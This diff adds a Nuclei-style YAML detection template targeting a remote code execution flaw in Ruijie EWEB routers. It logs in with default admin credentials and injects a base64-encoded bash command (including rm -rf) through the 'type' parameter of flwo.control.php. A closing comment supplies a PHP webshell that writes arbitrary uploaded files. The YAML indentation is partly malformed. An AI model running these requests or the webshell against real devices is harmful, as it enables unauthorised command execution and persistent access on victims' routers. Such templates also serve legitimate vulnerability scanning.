@@ -1,0 +1,45 @@
+id: ruijie-route-flwo-rce
+
+info:
+  name: ruijie-route-flwo-rce
+  author: HackTwo
+  severity: high
+  description: 锐捷 EWEB路由器 flwo.control.php 存在rce漏洞。
+  tags:  ruijie,rce
+
+http:
+  - raw:
+    - |              
+      POST /ddi/server/login.php HTTP/1.1
+      Host: {{hostname}}
+      Content-Type: application/x-www-form-urlencoded
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36 
+
+      username=admin&password=admin?
+      - |              
+      POST /flow_control_pi/flwo.control.php?a=getFlowGroup HTTP/1.1
+      Host: {{hostname}}
+      Content-Type: application/x-www-form-urlencoded
+      Cookie: RUIJIEID={{cookie}};user=admin;
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
+
+      type=%7Cbash+-c+%27echo+cm0gLXJmIC4uLzEyMzMyMXF3ZS50eHQgJiYgZWNobyBGMDhiYmZiMkJDOGNlZUQ2ID4gLi4vMTIzMzIxcXdlLnR4dCAyPiYx+%7C+base64+-d+%7C+bash+%26%26+exit+0%27
+
+      - |              
+      GET /123321qwe.txt HTTP/1.1
+      Host: {{hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36      
+
+      extractors:
+        - type: regex
+          name: cookie
+          part: header
+          group: 1
+          regex:
+            - "RUIJIEID=(.*); path=/"
+          internal: true
+      matchers:
+        - type: dsl
+          dsl:
+            - 'status_code_3==200 && contains(body_3, "F08bbfb2BC8ceeD6") && contains(body_3, "text/plain")'
+  #webshell:echo "<?php \$filename=\$_POST['filename'];\$content=base64_decode(\$_POST['content']);file_put_contents(\$filename,\$content);?>" > ../dadadadadaup.php
